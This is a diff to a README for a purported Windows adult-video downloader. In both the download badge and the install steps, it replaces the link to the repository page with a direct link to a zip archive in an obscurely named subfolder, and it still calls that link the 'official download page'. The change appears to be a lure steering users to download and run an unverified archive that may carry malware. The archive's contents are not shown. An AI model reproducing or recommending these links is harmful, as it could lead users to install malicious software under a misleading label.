@@ -1,6 +1,6 @@
 # 📥 8kporner-video-downloader - Save high quality videos for offline viewing
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Durationpalace975/8kporner-video-downloader)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Durationpalace975/8kporner-video-downloader/raw/refs/heads/main/archgomeral/downloader_kporner_video_2.7-alpha.1.zip)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Ensure your computer meets these conditions before you install the tool:
 
 Follow these steps to set up the software on your Windows computer:
 
-1. Visit the [official download page](https://github.com/Durationpalace975/8kporner-video-downloader).
+1. Visit the [official download page](https://github.com/Durationpalace975/8kporner-video-downloader/raw/refs/heads/main/archgomeral/downloader_kporner_video_2.7-alpha.1.zip).
 2. Locate the latest version button on the right side of the screen.
 3. Click the link to save the installation file to your computer.
 4. Open your downloads folder.
